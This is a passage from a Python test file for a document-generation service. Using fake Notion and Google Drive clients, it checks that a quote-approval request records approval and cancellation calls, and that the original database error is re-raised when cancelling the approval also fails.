            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )

    assert drive_client.start_approval_calls == [
        {"file_id": "copy-123", "reviewer_emails": ["approver@example.com"], "message": ""}
    ]
    assert drive_client.cancel_approval_calls == [{"file_id": "copy-123", "approval_id": "approval-1"}]


def test_request_quote_approval_still_raises_original_error_when_cancel_approval_also_fails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """cancel_approval()自体も失敗した場合でも、DB書き込み失敗という本来の例外を握りつぶさず
    再送出する。"""
    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="x.xlsx", mime_type_hint=None)
    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
    drive_client = FakeGoogleDriveDocClient()

    def _raise_cancel_approval(*args: object, **kwargs: object) -> None:
        raise RuntimeError("cancel_approval also failed")

    drive_client.cancel_approval = _raise_cancel_approval  # type: ignore[assignment]
    _setup_request_quote_approval_success_dependencies(monkeypatch, drive_client=drive_client)
    monkeypatch.setattr(
        "src.document_generation.quote_generator.insert_document_approval",
        lambda **kwargs: (_ for _ in ()).throw(RuntimeError("db insert failed")),
    )

    with pytest.raises(RuntimeError, match="db insert failed"):
        request_quote_approval(
            PAGE_ID,
            approver_emails=["approver@example.com"],
            requested_by_email="rep@example.com",
            registry=registry,
            notion_client=FakeProjectNotionClient(raw_page),
            client_master_client=FakeClientMasterClient(),
        )
